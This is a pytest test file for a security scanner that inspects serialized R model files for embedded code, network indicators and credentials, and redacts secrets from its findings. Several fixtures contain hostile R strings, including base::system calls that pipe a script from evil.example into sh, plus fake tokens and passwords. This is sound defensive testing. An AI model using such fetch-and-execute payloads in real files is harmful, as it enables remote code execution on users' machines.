from __future__ import annotations

import gzip
import lzma
import zipfile
from pathlib import Path
from unittest.mock import patch

import pytest

from modelaudit import core
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners._evidence_redaction import REDACTED_EVIDENCE_VALUE
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
from modelaudit.utils.file.detection import (
    detect_file_format,
    detect_file_format_for_skip_filter,
    detect_format_from_extension,
)


def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
    prefix = "RDX2\nX\n" if workspace_header else "X\n"
    path.write_bytes((prefix + body).encode("utf-8"))


def _write_raw_r_serialized_bytes(path: Path, body: bytes, *, workspace_header: bool = False) -> None:
    prefix = b"RDX2\nX\n" if workspace_header else b"X\n"
    path.write_bytes(prefix + body)


def _write_gzip_r_serialized(path: Path, body: str, *, workspace_header: bool = True) -> None:
    payload_prefix = "RDX2\nX\n" if workspace_header else "X\n"
    with gzip.open(path, "wb") as stream:
        stream.write((payload_prefix + body).encode("utf-8"))


def _write_xz_r_serialized(path: Path, body: str, *, dict_size: int) -> None:
    payload = ("X\n" + body).encode("utf-8")
    compressed = lzma.compress(
        payload,
        format=lzma.FORMAT_XZ,
        filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
    )
    path.write_bytes(compressed)


def _write_concatenated_xz_r_serialized(path: Path, bodies: list[str], *, dict_size: int) -> None:
    compressed_parts = [
        lzma.compress(
            ("X\n" + body).encode("utf-8"),
            format=lzma.FORMAT_XZ,
            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
        )
        for body in bodies
    ]
    path.write_bytes(b"".join(compressed_parts))


def _check_by_name(result: ScanResult, name: str) -> list[Check]:
    return [check for check in result.checks if check.name == name]


def test_can_handle_raw_rds_signature(tmp_path: Path) -> None:
    path = tmp_path / "safe.rds"
    _write_raw_r_serialized(path, "model\nlm\ncoefficients")

    assert RSerializedScanner.can_handle(str(path))


def test_can_handle_compressed_rdata_signature(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rdata"
    _write_gzip_r_serialized(path, "workspace\nmodel_a\nmodel_b")

    assert RSerializedScanner.can_handle(str(path))


def test_wrong_extension_with_no_signature_is_not_handled(tmp_path: Path) -> None:
    path = tmp_path / "payload.bin"
    path.write_bytes(b"not-an-r-serialized-object")

    assert not RSerializedScanner.can_handle(str(path))


def test_unavailable_declared_r_serialized_file_retains_owner_for_operational_result(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unavailable.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")

    def raise_read_error(*_args: object, **_kwargs: object) -> None:
        raise PermissionError(13, "simulated unavailable R payload")

    monkeypatch.setattr("modelaudit.scanners.r_serialized_scanner.open", raise_read_error, raising=False)

    scanner = get_scanner_for_file(str(path))

    assert scanner is not None
    assert scanner.name == "r_serialized"
    result = scanner.scan(str(path))
    assert result.metadata["operational_error_reason"] == "r_serialized_read_failed"


def test_scan_benign_rds_model_does_not_raise_critical(tmp_path: Path) -> None:
    path = tmp_path / "benign.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "model",
                "glm",
                "feature_systematic_score",
                "evaluation_metric",
                "parse_date_feature",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    assert all(check.severity != IssueSeverity.CRITICAL for check in result.checks)

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_bounded_r_serialized_payload_is_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "bounded.rds"
    _write_raw_r_serialized(path, "safe\n" * 64)

    result = RSerializedScanner(config={"r_max_scan_bytes": 32}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_byte_ceiling_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_read_failure_is_operationally_inconclusive_and_not_cached(tmp_path: Path) -> None:
    path = tmp_path / "read-failure.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with patch.object(
            RSerializedScanner,
            "_read_payload_for_analysis",
            side_effect=PermissionError(13, "simulated R payload read failure"),
        ):
            direct = RSerializedScanner().scan(str(path))
            first = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            second = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

        assert direct.success is False
        assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
        assert all(check.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
        read_check = _check_by_name(direct, "R Serialized Read")[0]
        assert read_check.details["analysis_incomplete"] is True
        assert read_check.details["scan_outcome_reason"] == "r_serialized_read_failed"

        for aggregate in (first, second):
            metadata = next(iter(aggregate.file_metadata.values()))
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
            assert metadata["operational_error_reason"] == "r_serialized_read_failed"
            assert core.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_read_failure_bypasses_stale_clean_cache(tmp_path: Path) -> None:
    path = tmp_path / "read-failure-after-cache.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")
    cache_dir = tmp_path / "cache"
    cache_config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        with patch(
            "modelaudit.utils.helpers.cache_decorator.should_bypass_cache_for_read_failure_aware_file",
            return_value=False,
        ):
            warm_result = core.scan_file(str(path), config=cache_config)

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        with patch.object(
            RSerializedScanner,
            "_read_payload_for_analysis",
            side_effect=PermissionError(13, "simulated R payload read failure after cache warm"),
        ):
            direct = core.scan_file(str(path), config=cache_config)
            aggregate = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

        assert direct.success is False
        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
        metadata = aggregate.file_metadata[str(path)]
        assert aggregate.success is False
        assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert metadata["operational_error_reason"] == "r_serialized_read_failed"
        assert core.determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_scan_renamed_read_failure_bypasses_stale_clean_cache(tmp_path: Path) -> None:
    path = tmp_path / "read-failure-after-cache.jpg"
    _write_raw_r_serialized(path, "safe\nmodel\nweights", workspace_header=True)
    cache_dir = tmp_path / "cache"
    cache_config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        with patch(
            "modelaudit.utils.helpers.cache_decorator.should_bypass_cache_for_read_failure_aware_file",
            return_value=False,
        ):
            warm_result = core.scan_file(str(path), config=cache_config)

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        with patch.object(
            RSerializedScanner,
            "_read_payload_for_analysis",
            side_effect=PermissionError(13, "simulated renamed R payload read failure after cache warm"),
        ):
            direct = core.scan_file(str(path), config=cache_config)
            aggregate = core.scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

        assert direct.success is False
        assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
        metadata = aggregate.file_metadata[str(path)]
        assert aggregate.success is False
        assert metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
        assert metadata["operational_error_reason"] == "r_serialized_read_failed"
        assert core.determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_scan_unreadable_path_is_operationally_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.rds"
    _write_raw_r_serialized(path, "safe\nmodel\nweights")
    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda *_args: False)

    direct = RSerializedScanner().scan(str(path))
    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    assert direct.success is False
    assert direct.metadata["scan_outcome_reasons"] == ["r_serialized_read_failed"]
    assert direct.metadata["operational_error_reason"] == "r_serialized_read_failed"
    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in direct.checks)
    metadata = aggregate.file_metadata[str(path)]
    assert metadata["operational_error_reason"] == "r_serialized_read_failed"
    assert core.determine_exit_code(aggregate) == 2


def test_scan_string_extraction_ceiling_reports_incomplete_late_payload_analysis(tmp_path: Path) -> None:
    path = tmp_path / "late-payload.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "feature_000",
                "feature_001",
                "feature_002",
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh | sh')",
            ]
        ),
    )

    full_result = RSerializedScanner(config={"r_max_extracted_strings": 100}).scan(str(path))
    limited_result = RSerializedScanner(config={"r_max_extracted_strings": 2}).scan(str(path))

    assert any(check.severity == IssueSeverity.CRITICAL for check in full_result.checks)
    assert limited_result.success is False
    assert limited_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_string_extraction_incomplete" in limited_result.metadata["scan_outcome_reasons"]
    assert not any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in limited_result.checks)
    ceiling_checks = _check_by_name(limited_result, "String Extraction Ceiling")
    assert len(ceiling_checks) == 1
    assert ceiling_checks[0].severity == IssueSeverity.INFO
    assert "configured extracted-string ceiling" in ceiling_checks[0].message
    assert ceiling_checks[0].details["analysis_incomplete"] is True
    assert ceiling_checks[0].details["scan_outcome_reason"] == "r_serialized_string_extraction_incomplete"


def test_scan_string_extraction_ceiling_is_exit2_and_not_cached(tmp_path: Path) -> None:
    path = tmp_path / "limited.rds"
    _write_raw_r_serialized(path, "feature_000\nfeature_001\nfeature_002\nfeature_003")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            r_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            r_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert "r_serialized_string_extraction_incomplete" in metadata["scan_outcome_reasons"]
            assert core.determine_exit_code(aggregate) == 2
            assert not any(
                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_dense_text_payload_still_reports_stuffing_warning(tmp_path: Path) -> None:
    path = tmp_path / "dense.rds"
    _write_raw_r_serialized(path, "A" * 1_000_100)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].severity == IssueSeverity.WARNING
    assert "scan_outcome" not in result.metadata


def test_scan_oversized_contiguous_text_reports_stuffing_below_dense_threshold(tmp_path: Path) -> None:
    path = tmp_path / "oversized-string.rds"
    _write_raw_r_serialized(path, "A" * 9_000)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].severity == IssueSeverity.WARNING
    assert stuffing_checks[0].details["longest_string"] > 8_192
    assert "scan_outcome" not in result.metadata


def test_scan_whitespace_padding_does_not_report_payload_stuffing(tmp_path: Path) -> None:
    path = tmp_path / "whitespace-padding.rds"
    _write_raw_r_serialized(path, " " * 9_000)

    result = RSerializedScanner().scan(str(path))

    stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
    assert len(stuffing_checks) == 1
    assert stuffing_checks[0].status == CheckStatus.PASSED
    assert stuffing_checks[0].details["longest_string"] == 0
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_short_text_with_trailing_padding_does_not_report_payload_stuffing(tmp_path: Path) -> None:
    payload = "model" + (" " * 9_000)
    direct_path = tmp_path / "padding.rds"
    renamed_workspace = tmp_path / "padding.jpg"
    _write_raw_r_serialized(direct_path, payload)
    _write_raw_r_serialized(renamed_workspace, payload, workspace_header=True)

    direct = RSerializedScanner().scan(str(direct_path))
    renamed = core.scan_file(str(renamed_workspace), config={"cache_enabled": False})
    aggregate = core.scan_model_directory_or_file(str(renamed_workspace), cache_enabled=False)

    for result in (direct, renamed):
        stuffing_checks = _check_by_name(result, "Serialized Payload Stuffing Detection")
        assert len(stuffing_checks) == 1
        assert stuffing_checks[0].status == CheckStatus.PASSED
        assert stuffing_checks[0].details["longest_string"] == len("model")
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert renamed.scanner_name == "r_serialized"
    assert core.determine_exit_code(aggregate) == 0


def test_scan_detects_executable_call_split_at_printable_chunk_boundary(tmp_path: Path) -> None:
    path = tmp_path / "split-system-call.rds"
    _write_raw_r_serialized(path, "A" * 503 + "base::system('id')")

    direct = RSerializedScanner().scan(str(path))
    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    symbol_checks = _check_by_name(direct, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    assert core.determine_exit_code(aggregate) == 1


def test_scan_preserves_short_printable_tail_at_chunk_boundary(tmp_path: Path) -> None:
    path = tmp_path / "split-system-call-tail.rds"
    _write_raw_r_serialized_bytes(path, b"A" * 500 + b"base::system(\x00'id')")

    direct = RSerializedScanner().scan(str(path))
    aggregate = core.scan_model_directory_or_file(str(path), cache_scan_results=False)

    symbol_checks = _check_by_name(direct, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    assert core.determine_exit_code(aggregate) == 1


def test_scan_benign_rdata_workspace_passes_signature_and_context_checks(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rda"
    _write_raw_r_serialized(path, "workspace\nmodel_one\nmodel_two", workspace_header=True)

    result = RSerializedScanner().scan(str(path))

    signature_checks = _check_by_name(result, "R Serialization Signature")
    assert len(signature_checks) == 1
    assert signature_checks[0].status == CheckStatus.PASSED

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.PASSED


def test_scan_detects_malicious_expression_and_bypass_noise(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rdata"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh # harmless comment | sh')",
                "AKIAABCDEFGHIJKLMNOP",
            ]
        ),
        workspace_header=True,
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                (
                    "base::system('curl "
                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT | sh')"
                ),
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    details = network_checks[0].details
    assert details["urls"] == ["https://evil.example/payload.sh"]
    assert "user" not in str(details)
    assert "pass" not in str(details)
    assert "SECRET_TOKEN" not in str(details)
    assert "SECRET_FRAGMENT" not in str(details)


def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
    path = tmp_path / "sample-leak.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                (
                    "base::system('curl "
                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT "
                    "| sh; token <- \"R_TOKEN_123456\"; password <<- 'R_PASS_123456'; "
                    "Authorization: Bearer ABCDEFGHIJKLMNOP')"
                ),
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    samples = [
        symbol_checks[0].details["examples"][0]["sample"],
        payload_checks[0].details["examples"][0]["sample"],
    ]

    for sample in samples:
        assert "base::system" in sample
        assert "curl" in sample
        assert "evil.example/payload.sh" in sample
        assert "<redacted>" in sample
        assert "user:pass" not in sample
        assert "SECRET_TOKEN" not in sample
        assert "SECRET_FRAGMENT" not in sample
        assert "R_TOKEN_123456" not in sample
        assert "R_PASS_123456" not in sample
        assert "ABCDEFGHIJKLMNOP" not in sample


def test_scan_redacts_rightward_assignment_payload_samples(tmp_path: Path) -> None:
    path = tmp_path / "rightward-sample-leak.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                "base::system('curl'); 'R_TOKEN_RIGHTWARD' -> token; "
                + '"R_PASS_RIGHTWARD" ->> password; R_BARE_RIGHTWARD -> access_token',
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    samples = [
        symbol_checks[0].details["examples"][0]["sample"],
        payload_checks[0].details["examples"][0]["sample"],
    ]

    for sample in samples:
        assert "base::system" in sample
        assert "curl" in sample
        assert "<redacted>" in sample
        assert "R_TOKEN_RIGHTWARD" not in sample
        assert "R_PASS_RIGHTWARD" not in sample
        assert "R_BARE_RIGHTWARD" not in sample


def test_scan_redacts_and_detects_rightward_assignment_expressions(tmp_path: Path) -> None:
    path = tmp_path / "rightward-expression-sample-leak.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); paste("PREFIX;RIGHTWARD_SECRET", collapse=";") -> token',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert 'base::system("curl")' in sample
    assert "<redacted> -> token" in sample
    assert "PREFIX" not in sample
    assert "RIGHTWARD_SECRET" not in sample


def test_scan_redacts_and_detects_leftward_assignment_expressions(tmp_path: Path) -> None:
    path = tmp_path / "leftward-expression-sample-leak.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- paste0("LEFTWARD_SECRET", "TAIL")',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert 'base::system("curl")' in sample
    assert f"token <- {REDACTED_EVIDENCE_VALUE}" in sample
    assert "LEFTWARD_SECRET" not in sample
    assert "TAIL" not in sample


@pytest.mark.parametrize(
    ("assignment", "secret"),
    [
        (r'token <- "ABC\"ESCAPED_SECRET"', "ESCAPED_SECRET"),
        ('`access-token` <- "BACKTICK_LEFT_SECRET"', "BACKTICK_LEFT_SECRET"),
        ('"BACKTICK_RIGHT_SECRET" -> `client-secret`', "BACKTICK_RIGHT_SECRET"),
        ('`access token` <- "SPACED_BACKTICK_SECRET"', "SPACED_BACKTICK_SECRET"),
        ('`access token` = "BACKTICK_EQUALS_SECRET"', "BACKTICK_EQUALS_SECRET"),
        ('api.key <- "DOT_LEFT_SECRET"', "DOT_LEFT_SECRET"),
        ('"DOT_RIGHT_SECRET" -> access.token', "DOT_RIGHT_SECRET"),
        ('dbPassword <- "CAMEL_PASSWORD_SECRET"', "CAMEL_PASSWORD_SECRET"),
        ('sessionToken <<- "CAMEL_TOKEN_SECRET"', "CAMEL_TOKEN_SECRET"),
        ('`dbPassword` <- "BACKTICK_CAMEL_SECRET"', "BACKTICK_CAMEL_SECRET"),
        ('token[1] <- "INDEXED_TOKEN_SECRET"', "INDEXED_TOKEN_SECRET"),
        ('config$token <- "MEMBER_TOKEN_SECRET"', "MEMBER_TOKEN_SECRET"),
        ('config@password <- "SLOT_PASSWORD_SECRET"', "SLOT_PASSWORD_SECRET"),
        ('config[["api_key"]] <- "SUBSCRIPT_API_SECRET"', "SUBSCRIPT_API_SECRET"),
        ('"RIGHT_MEMBER_SECRET" -> config$token', "RIGHT_MEMBER_SECRET"),
        ('pwd <- "PWD_SECRET_VALUE"', "PWD_SECRET_VALUE"),
        ('token <- r"(RAW_LEFT_SECRET)"', "RAW_LEFT_SECRET"),
        ('token = r"(RAW_EQUALS_SECRET)"', "RAW_EQUALS_SECRET"),
        ('R"---{RAW_RIGHT_SECRET}---" -> client.secret', "RAW_RIGHT_SECRET"),
        ('refresh.token <- r"[raw values may contain \\"quotes\\" and ; delimiters]"', "raw values may contain"),
        ('token <- r"(UNTERMINATED_RAW_SECRET', "UNTERMINATED_RAW_SECRET"),
        ('"access token" <- "QUOTED_NAME_SECRET"', "QUOTED_NAME_SECRET"),
        ("r\"(QUOTED_RAW_SECRET)\" -> 'client.secret'", "QUOTED_RAW_SECRET"),
    ],
)
def test_scan_redacts_complex_r_assignment_payload_samples(tmp_path: Path, assignment: str, secret: str) -> None:
    path = tmp_path / "complex-assignment-sample-leak.rds"
    _write_raw_r_serialized(path, f"expression\nlanguage\nbase::system('curl'); {assignment}")

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    samples = [
        symbol_checks[0].details["examples"][0]["sample"],
        payload_checks[0].details["examples"][0]["sample"],
    ]

    for sample in samples:
        assert "<redacted>" in sample
        assert secret not in sample


@pytest.mark.parametrize(
    "assignment",
    [
        "token <- 'LEFTWARD_SECRET'",
        "password <<- 'GLOBAL_LEFT_SECRET'",
        "'RIGHTWARD_SECRET' -> token",
        "'GLOBAL_RIGHT_SECRET' ->> password",
        "access_token <- 'COMPOUND_LEFT_SECRET'",
        "'COMPOUND_RIGHT_SECRET' -> client_secret",
        "`access-token` <- 'BACKTICK_LEFT_SECRET'",
        "'BACKTICK_RIGHT_SECRET' -> `refresh-token`",
        "`api key` <- 'SPACED_BACKTICK_SECRET'",
        '`access token` = "BACKTICK_EQUALS_SECRET"',
        r'token <- "ABC\"ESCAPED_SECRET"',
        "api.key <- 'DOT_LEFT_SECRET'",
        "'DOT_RIGHT_SECRET' -> access.token",
        "dbPassword <- 'CAMEL_PASSWORD_SECRET'",
        "sessionToken <<- 'CAMEL_TOKEN_SECRET'",
        "`dbPassword` <- 'BACKTICK_CAMEL_SECRET'",
        "token[1] <- 'INDEXED_TOKEN_SECRET'",
        "config$token <- 'MEMBER_TOKEN_SECRET'",
        "config@password <- 'SLOT_PASSWORD_SECRET'",
        'config[["api_key"]] <- "SUBSCRIPT_API_SECRET"',
        "'RIGHT_MEMBER_SECRET' -> config$token",
        "pwd <- 'PWD_SECRET_VALUE'",
        'token <- r"(RAW_LEFT_SECRET)"',
        'token = r"(RAW_EQUALS_SECRET)"',
        'R"---{RAW_RIGHT_SECRET}---" -> client.secret',
        'refresh.token <- r"[raw values may contain \\"quotes\\" and ; delimiters]"',
        '"access token" <- "QUOTED_NAME_SECRET"',
        "r\"(QUOTED_RAW_SECRET)\" -> 'client.secret'",
    ],
)
def test_scan_detects_native_r_credential_assignments(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "native-credential-assignment.rds"
    _write_raw_r_serialized(path, assignment)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    assert credential_checks[0].details["pattern_classes"] == ["generic_secret_assignment"]


def test_scan_redacts_unterminated_raw_assignment_without_credential_false_positive(tmp_path: Path) -> None:
    path = tmp_path / "unterminated-raw-assignment.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- r"(UNTERMINATED_RAW_SECRET',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "UNTERMINATED_RAW_SECRET" not in sample
    assert sample.endswith("token <- <redacted>")


def test_scan_recovers_after_malformed_raw_prefix(tmp_path: Path) -> None:
    path = tmp_path / "malformed-prefix-before-credential.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); r"{BROKEN_PREFIX; token <- r"(LATER_RAW_SECRET)"',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "LATER_RAW_SECRET" not in sample
    assert sample.endswith("token <- <redacted>")


@pytest.mark.parametrize(
    "assignment",
    [
        'token <- r"(MULTILINE_RAW_SECRET\ncurl payload)"',
        'token <- "MULTILINE_QUOTED_SECRET\ncurl payload"',
    ],
)
def test_scan_detects_and_redacts_multiline_credential_assignments(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "multiline-credential-assignment.rds"
    _write_raw_r_serialized(
        path,
        f'expression\nlanguage\nbase::system("curl"); {assignment}',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "<redacted>" in sample
    assert "MULTILINE" not in sample
    assert "payload" not in sample


def test_scan_redacts_indented_multiline_credential_assignment(tmp_path: Path) -> None:
    path = tmp_path / "indented-multiline-credential-assignment.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- "FIRST_SECRET\n\tSECOND_SECRET base::system(curl)"',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "FIRST_SECRET" not in sample
    assert "SECOND_SECRET" not in sample
    assert REDACTED_EVIDENCE_VALUE in sample


def test_scan_redacts_unterminated_quoted_assignment_without_credential_false_positive(tmp_path: Path) -> None:
    path = tmp_path / "unterminated-quoted-assignment.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- "UNTERMINATED_QUOTED_SECRET',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
